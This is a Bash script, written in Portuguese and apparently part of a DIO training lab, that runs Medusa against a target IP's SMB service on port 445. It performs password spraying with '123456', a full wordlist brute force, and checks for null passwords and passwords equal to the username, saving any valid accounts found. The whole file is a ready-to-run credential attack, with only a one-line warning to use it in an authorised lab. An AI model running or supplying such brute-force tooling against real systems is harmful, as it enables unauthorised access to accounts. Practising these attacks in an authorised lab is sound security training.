#!/usr/bin/env bash
# ============================================================
#  Fase 3 — Ataque SMB com Medusa (Kali Linux)
#  Desafio DIO: força bruta SMB com Medusa
#
#  Uso:  ./02-medusa-smb.sh <IP_DO_ALVO>
#  Ex.:  ./02-medusa-smb.sh 192.168.56.20
#
#  ⚠️  Somente em laboratório com autorização!
# ============================================================

TARGET="${1:?Uso: $0 <IP_do_alvo>}"

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
USERS="$ROOT/wordlists/users.txt"
PASS="$ROOT/wordlists/passwords.txt"
OUT="$ROOT/results"
mkdir -p "$OUT"

echo "[*] Alvo: $TARGET  |  Usuários: $USERS  |  Senhas: $PASS"
echo "[!] Tarefa paralela por host limitada a -t 4 (laboratório: mais gentil e estável)"

echo
echo "[*] 1/3 — Password spraying (uma senha comum contra muitos usuários)..."
medusa -h "$TARGET" -U "$USERS" -p '123456' \
       -M smbnt -n 445 -t 4 -v 4 \
       -o "$OUT/medusa-spray.txt"

echo
echo "[*] 2/3 — Força bruta completa (todos os usuários x todas as senhas)..."
medusa -h "$TARGET" -U "$USERS" -P "$PASS" \
       -M smbnt -n 445 -t 4 -T 8 -v 4 \
       -o "$OUT/medusa-smb.txt"

echo
echo "[*] 3/3 — Senha nula e senha = usuário (-e ns)..."
medusa -h "$TARGET" -U "$USERS" -e ns \
       -M smbnt -n 445 -t 4 -v 4 \
       -o "$OUT/medusa-ens.txt"

echo
echo "[+] Concluído! Procure por 'ACCOUNT FOUND ... [VALID]' em results/medusa-*.txt"
echo "    Se o módulo smbnt falhar contra o Samba antigo, tente -n 139."
echo "    Próximo passo: ./03-validacao-smbclient.sh $TARGET"
